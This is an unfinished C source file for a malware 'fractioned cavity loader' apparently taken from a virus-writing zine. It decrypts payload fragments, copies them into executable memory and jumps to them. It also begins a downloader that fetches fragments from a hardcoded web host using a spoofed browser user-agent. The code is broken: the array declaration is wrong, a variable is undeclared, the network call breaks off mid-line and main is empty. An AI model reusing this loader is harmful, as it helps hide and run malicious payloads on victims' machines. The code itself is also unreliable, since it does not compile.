/**
 * loader.c
 * This code is based on smelly_vx fractioned cavity loader published in
 * vxug vol 1 zine.
 *
 * This file takes a directory of fractioned files from breaker.c, dencrypts
 * verifies and maps them to executable memory and then executes the file.
 *
 * The Encryption/Decryption used here is the sample code found:
 * https://github.com/saju/misc/blob/master/misc/openssl_aes.c
 *
 * Travis M. <trav@hexproof.sh>
 * Website: hexproof.sh
 *
**/
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#include "cavity.h"

const char *url = "http://www.hexproof.sh";
const char fractions[11] ={"fraction_0.bin", "fraction_1.bin", "fraction_2.bin",
	                   "fraction_3.bin", "fraction_4.bin", "fraction_5.bin",
			   "fraction_6.bin", "fraction_7.bin", "fraction_8.bin",
			   "fraction_9.bin", "fraction_10.bin", "fraction_11.bin"};


int
execute_loaded_fractions(unsigned char *fractions, int fraction_len) {
  unsigned char *fractions_ex;

  fractions_ex = (unsigned char *) mmap (0, fraction_len, MMAP_PARAMS, -1, 0);
  if (fractions_ex == MAP_FAILED)
    {
      return -1;
    }

  memcpy (fractions_ex, fractions, fraction_len);

  (*(void (*)()) fractions_ex) ();

  return 0;

}

void create_get_request(char *buffer, size_t buffer_size, const char *host, const char *path) {
    snprintf(buffer, buffer_size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host);
}

int
download_fraction(char *url) {
    struct addrinfo *result;
    struct addrinfo hints;
    int sd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM; 
    hints.ai_flags = 0;
    hints.ai_protocol = 0;  

    addr = getaddrinfo(    
}

int 
main(int argc, char *argv[]) {
  

  return 0;
}
